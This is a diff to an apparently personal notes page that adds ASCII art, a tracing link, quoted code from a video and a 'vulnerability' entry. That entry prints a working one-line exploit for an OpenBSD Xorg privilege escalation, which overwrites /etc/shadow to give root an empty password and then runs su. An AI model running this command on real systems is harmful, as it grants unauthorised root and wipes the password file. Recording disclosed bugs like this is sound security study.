@@ -11,6 +11,20 @@ path: "/misc/"
 
 * ascii art
 
+** rad
+#+BEGIN_EXAMPLE
+____/\\\\\\\\\_________/\\\\\\\\\_____/\\\\\\\\\\\\____
+ __/\\\///////\\\_____/\\\\\\\\\\\\\__\/\\\////////\\\__
+  _\/\\\_____\/\\\____/\\\/////////\\\_\/\\\______\//\\\_
+   _\/\\\\\\\\\\\/____\/\\\_______\/\\\_\/\\\_______\/\\\_
+    _\/\\\//////\\\____\/\\\\\\\\\\\\\\\_\/\\\_______\/\\\_
+     _\/\\\____\//\\\___\/\\\/////////\\\_\/\\\_______\/\\\_
+      _\/\\\_____\//\\\__\/\\\_______\/\\\_\/\\\_______/\\\__
+       _\/\\\______\//\\\_\/\\\_______\/\\\_\/\\\\\\\\\\\\/___
+        _\///________\///__\///________\///__\////////////_____
+#+END_EXAMPLE
+
+** v
 #+BEGIN_SRC js
 console.log('%c \n\
 ⎜       @@@&       @@@@@@\n\
@@ -65,3 +79,60 @@ undefined
 copyright & metadata location:
 
 - /Library/Application Support/Adobe/XMP/Metadata Templates/
+* tracing
+
+https://explog.in/notes/tracers.html
+
+* vulnerability
+
+OpenBSD Xorg priv escalation ([[https://arstechnica.com/information-technology/2018/10/x-org-bug-that-gives-attackers-root-bites-openbsd-and-other-big-name-oses/][ref]]):
+
+#+BEGIN_SRC sh
+cd /etc; Xorg -fp
+"Root::16431:0:99999:7:::" -logfile
+shadow  :1;su
+#+END_SRC
+
+
+* movie code
+
+** from https://www.youtube.com/watch?v=THN42GYtWrw
+
+> The compression is awesome.
+
+> Structure's perfect.
+
+
+#+BEGIN_SRC c
+{
+
+/* ... */
+
+    for (; i < nread; i++) {
+        if (buf[i] == (byte)'\n' || buf[i] == (byte)'\r') {
+            break outerloop;
+        }
+    }
+}
+
+boolean doingGet;
+int index;
+if (buf[0] == (byte)'G' &&
+    buf[1] == (byte)'E' &&
+    buf[2] == (byte)'T' &&
+    buf[3] == (byte)' ') {
+    doingGet = true;
+    index = 4;
+} else if (buf[0] == (byte)'H' &&
+        buf[1] == (byte)'E' &&
+        buf[2] == (byte)'A' &&
+        buf[3] == (byte)'D' &&
+        buf[4] == (byte)' ') {
+    doingGet = false;
+    index = 5
+} else {
+
+/* ... */
+
+}
+#+END_SRC
